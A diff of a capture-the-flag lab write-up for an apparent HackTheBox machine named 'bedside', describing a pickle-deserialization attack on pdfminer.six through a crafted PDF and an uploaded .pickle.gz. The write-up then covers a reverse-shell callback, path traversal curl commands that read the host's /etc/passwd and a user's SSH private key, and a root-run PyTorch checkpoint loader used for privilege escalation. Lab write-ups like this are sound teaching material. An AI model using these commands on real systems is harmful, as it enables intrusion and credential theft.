@@ -102,9 +102,9 @@ X-Powered-By: pdfminer.six
 
 ## PDFMiner - Code Execution via Uploads
 
-With a little research, `pdfminer.six` was vulnerable to **CVE-2025-64512**, a deserialization exploit within its CMap loading code. The vulnerability stems from a PDF being able to name a CMap (character map) file (like .pickle.gz), and the vulnerable PDFMiner versions could load a gzip-compressed pickle from a malicious PDF. Combining this with Python's `pickle.loads()`, attackers can execute code whilst rebuilding an object.
+With a little research, `pdfminer.six` was vulnerable to **CVE-2025-64512**, a deserialization exploit within its CMap loading code. The vulnerability stems from a PDF being able to name a CMap (character map) file (like .pickle.gz), and vulnerable versions of PDFMiner could be influenced on which CMap file to load, for example, from a PDF. Combining this with Python's `pickle.loads()`, attackers could execute code during the rebuilding of an object.
 
-Basically, the vulnerability let me use a PDF's font encoding to point PDFMiner toward a file outside its normal character map directory. Since I already knew where uploads were stored, I could upload a malicious `.pickle.gz` file and create a PDF that referenced it. And when the server processed the PDF, PDFMiner would load the pickle using `pickle.loads()`, executing my embedded Python payload. 
+> Basically, the vulnerability let me use a PDF's font encoding to point PDFMiner toward a file outside its normal character map directory. Since I already knew where uploads were stored, I could upload a malicious `.pickle.gz` file and create a PDF that referenced it. When the server processes the PDF, PDFMiner would load the pickle using `pickle.loads()`, and execute my Python payload. 
 
 Since I knew the directory path, I started by uploading my `.pickle.gz` files there.
 
@@ -117,10 +117,10 @@ Content-Type: application/x-gzip
 
 It's also important to mention the exploit requires **two files**, not just the malicious PDF:
 
-1. A `.pickle.gz` file in the known uploads directory.
-2. A PDF whose font `/Encoding` references that file's absolute path. PDFMiner appends `.pickle.gz` when looking up the CMap.
+1. A `.pickle.gz` file in the known uploads directory containing the payload.
+2. A PDF whose font references the malicious pickle through `/Encoding` (triggering the execution).
 
-I built the PDF with the font encoding pointing to the uploaded pickle. The interesting part of the PDF object was:
+I built No.2, the PDF with the font encoding pointing to my uploaded payload pickle. The interesting part here was:
 
 ```pdf
 /Type /Font
@@ -130,9 +130,9 @@ I built the PDF with the font encoding pointing to the uploaded pickle. The inte
 /DescendantFonts [6 0 R]
 ```
 
-Here, `#2F` represents `/` in a PDF name. The reference ultimately resolves to the uploaded file under `/var/www/research.bedside.htb/uploads/`. I included the payload-building code in [`scripts/build_pdfminer_payload.py`](scripts/build_pdfminer_payload.py) so the mechanics are available without turning this section into a wall of Python.
+The `#2F` here represents a `/` in a PDF name. The reference, once decoded, is: `/var/www/research.bedside.htb/uploads/`. I included the Python payload-building code under [`scripts/build_pdfminer_payload.py`](scripts/build_pdfminer_payload.py) if you want to take a closer look at it.
 
-I first tested with a harmless HTTP callback instead of immediately launching a shell. On Parrot:
+Before running these two files with a netcat listener, I tested with a harmless HTTP callback:
 
 ```bash
 ┌──[brandonc@parrot]─[~]
@@ -140,7 +140,7 @@ I first tested with a harmless HTTP callback instead of immediately launching a 
 Serving HTTP on 10.10.14.206 port 8000 ...
 ```
 
-After uploading `cmap-net.pickle.gz` and `trigger-net.pdf`, the target contacted my server:
+After uploading `cmap-net.pickle.gz` and `trigger-net.pdf`, the machine contacted my server:
 
 ```text
 10.129.134.251 - - "GET / HTTP/1.1" 200 -
@@ -148,9 +148,7 @@ After uploading `cmap-net.pickle.gz` and `trigger-net.pdf`, the target contacted
 10.129.134.251 - - "GET / HTTP/1.1" 200 -
 ```
 
-The requests arrived roughly 30 seconds apart. At first I only knew the upload worked; the callback was the first real proof that **the server had parsed the PDF and run my payload**.
-
-I then switched to a reverse-shell payload. I used `10.10.14.206` on `tun0` and port `4444`:
+The requests arrived roughly 30 seconds apart, and was confirmation that my payload would work. I then switched to a reverse-shell payload, using `10.10.14.206` on `tun0` and port `4444`:
 
 ```bash
 ┌──[brandonc@parrot]─[~]
@@ -190,11 +188,9 @@ data-wrangler
   <em>Figure 1: Both files land in the upload directory. The PDF worker reads the PDF, follows its CMap reference, and deserializes the uploaded pickle as datawrangler.</em>
 </p>
 
-*One small terminal mistake along the way: I pasted a Python heredoc into Zsh and got `zsh: event not found: r`. Disabling history expansion with `unsetopt BANG_HIST` let me rerun the script cleanly. I also learned to keep heredoc delimiters on their own lines, especially in the limited reverse shell.*
-
 ## Inside the Data-Wrangler Container
 
-The hostname was different from `bedside`, and the filesystem had `/.dockerenv`, so I was in a Docker container rather than on the host. My first flag searches in `/home` and `/app` came up empty.
+The filesystem that I connected to had `/.dockerenv`, so I could infer I was in a Docker container and not yet on the host. There were a couple files present in the `/app` directory that I could take a look at next:
 
 ```bash
 datawrangler@data-wrangler:/app$ ls -la /app
@@ -202,7 +198,7 @@ datawrangler@data-wrangler:/app$ ls -la /app
 -rw-rw-r-- 1 root root   23 Nov  9 2025 requirements.txt
 ```
 
-The file I actually found in `/app` was `pdf_watcher.py`. Its core behavior explained the repeating callbacks:
+The interesting file in `/app` was `pdf_watcher.py`. Its behavior explained the repeating callbacks noted earlier:
 
 ```python
 UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
@@ -213,7 +209,7 @@ SLEEP_INTERVAL = 30
 subprocess.run(["pdf2txt.py", pdf_path, "-o", output_file], timeout=10, check=True)
 ```
 
-The worker scanned uploaded PDFs every 30 seconds and extracted their text to `/datastore/staging`. This was how my malicious PDF kept triggering. I also found that `/datastore` and the uploads directory were mounted into the container from the host filesystem.
+The `pdf_watcher.py` scanned uploaded PDFs every 30 seconds and had their text written to `/datastore/staging`, illustrating how my payloads were able to continuously trigger. I also was able to find that `/datastore` and `/uploads` were mounted into the container from the host filesystem. I was back to the enumeration stage, looking for paths to virtual escape or ways to interact with the host more...
 
 ```bash
 datawrangler@data-wrangler:/app$ cat /proc/self/mountinfo | grep -E 'datastore|research.bedside'
@@ -221,11 +217,11 @@ datawrangler@data-wrangler:/app$ cat /proc/self/mountinfo | grep -E 'datastore|r
 253 241 8:4 /var/www/research.bedside.htb/uploads /var/www/research.bedside.htb/uploads rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
 ```
 
-Having writable storage didn't give me an escape by itself. Instead, I revisited **port 3000**, the filtered port from my original scan.
+Having writable storage didn't give me an escape by itself. I looked back at the filtered **port 3000** from before (original Nmap scan).
 
 ## Port 3000 — From Docker to the Host
 
-From Parrot, TCP port `3000` timed out. From inside the container, it was reachable:
+From my Parrot machine, TCP port `3000` timed out. Now, from inside the Docker container, it was reachable:
 
 ```bash
 datawrangler@data-wrangler:/app$ curl -i --max-time 8 http://10.129.134.251:3000/
@@ -235,9 +231,9 @@ Content-Type: text/html; charset=utf-8
 <title>Bedside Clinic - Image Viewer</title>
 ```
 
-The page was a React-based MRI image viewer with hot module reloading. Its source referenced `/@hmr`, and later I learned the process was launched with `/usr/bin/esm.sh serve .`. I tried a couple of normal file requests, but `/package.json` and `/.env` returned 404.
+The page was an MRI image viewer with hot module reloading (HMR), which was interesting. Its source referenced `/@hmr`, was able to find the process launches with `/usr/bin/esm.sh serve .`. I thought that since this was a deployment server (via this excerpt: `import createHotContext from "/@hmr";`), there could be some exposed functionalities. I tried a couple of normal file requests, but `/package.json` and `/.env` both returned 404.
 
-I then tested whether the development server would let me request files outside its web root. The important `curl` flag was `--path-as-is`, which keeps `../` segments intact instead of normalizing them away on my side:
+I also tested if the development server would let me request files outside its web root. The important piece of information that progressed my attack was the `curl` flag `--path-as-is`, which keeps `../` segments intact instead of normalizing them (and thus providing an attack vector for directory traversal):
 
 ```bash
 datawrangler@data-wrangler:/app$ curl --path-as-is -i \
@@ -248,7 +244,7 @@ Content-Type: application/octet-stream
 bedside
 ```
 
-That was my breakthrough. I could read the **host's** `/etc/hostname`, not the container's. I checked `/etc/passwd` next and found `developer`, UID 1000. The server's process status also showed it ran with UID 1000:
+That command was the breakthrough I was looking for. I could read the **host's** `/etc/hostname`, instead of container's. I checked `/etc/passwd` next and found `developer`, UID 1000. The server's process status also showed it ran with UID 1000, and so I could read files `developer` was permitted to read:
 
 ```bash
 datawrangler@data-wrangler:/app$ curl -s --path-as-is \
@@ -264,10 +260,9 @@ That same traversal gave me the **user flag**:
 ```bash
 datawrangler@data-wrangler:/app$ curl -s --path-as-is \
   "http://10.129.134.251:3000/../../../../home/developer/user.txt"
-[redacted user flag]
 ```
 
-I was still sitting in a container shell, though, and I wanted actual host access. Looking into `developer`'s SSH directory paid off:
+I had some important exploits found, but I was still operating in the container shell. After a little searching, I found `developer`'s SSH key:
 
 ```bash
 datawrangler@data-wrangler:/app$ curl -i --path-as-is \
@@ -280,7 +275,7 @@ Content-Type: application/octet-stream
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-Despite the name `id_rsa`, the file contained an **unencrypted Ed25519 key**. I saved it to `developer_key` on Parrot, restricted its permissions, and used it to SSH directly into the machine:
+Though the name was `id_rsa`, the file contained an **unencrypted Ed25519 key**. I saved it as `developer_key` on Parrot, restricted its permissions, and used it to SSH directly into the machine:
 
 ```bash
 ┌──[brandonc@parrot]─[~]
@@ -300,11 +295,9 @@ bedside
   <em>Figure 2: The container could reach the internal image viewer. A path traversal exposed developer's SSH key, which gave me an interactive shell on bedside.</em>
 </p>
 
-At that point, **I had the user flag and a proper shell as `developer` on the host**.
+## Privilege Escalation - Using the MONAI Trainer
 
-## Privilege Escalation — The MONAI Trainer
-
-My first command after SSH was `sudo -l`:
+My first command after SSH'ing as `developer` was `sudo -l`:
 
 ```bash
 developer@bedside:~$ sudo -l
@@ -313,7 +306,7 @@ User developer may run the following commands on bedside:
     (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
 ```
 
-I couldn't edit the script itself—it was owned by root—but I could read it. It was a MONAI/PyTorch training script that used directories under `/datastore`:
+`developer` has sudo permissions for running a `bedside_trainer.py` script. I couldn't edit the file itself, as it was owned by root, but I could read it. It was a MONAI/PyTorch training script that used directories under `/datastore`:
 
 ```python
 CHECKPOINT_DIR = Path("/datastore/checkpoints")
@@ -321,7 +314,7 @@ PROCESSED_DIR = Path("/datastore/processed")
 STAGING_DIR = Path("/datastore/staging")
 ```
 
-The interesting part was how it selected and loaded checkpoints:
+The interesting part of its functionality was how it selected and loaded checkpoints. There seems to be an absence of any sort of verification -- It loads the newest checkpoint and runs it without checking who wrote it:
 
 ```python
 def find_latest_checkpoint(checkpoint_dir):
@@ -338,9 +331,9 @@ loader = CheckpointLoader(
 loader(engine)
 ```
 
-This is where the two accounts fit together. **`developer` could launch the trainer as root, but couldn't even list `/datastore/checkpoints`**. Meanwhile, `datawrangler` inside Docker could write there. The restricted account had access to the data; the privileged process trusted that data.
+This is where the two accounts fit together. **`developer` could launch the trainer as root, but couldn't read or write to `/datastore/checkpoints`**. I still had the docker shell for `datawrangler` open, and `datawranger` did have the ability to write there. The restricted account had access to the data, and the privileged process trusts that data. Combining the two will allow me root access.
 
-I checked the installed libraries: PyTorch `2.5.0+cpu`, MONAI `1.5.0`. Reading the implementation of `CheckpointLoader.__call__` revealed the line that mattered:
+I checked the installed libraries: PyTorch `2.5.0+cpu`, MONAI `1.5.0`. Reading the implementation of `CheckpointLoader.__call__` revealed one line that mattered:
 
 ```python
 checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
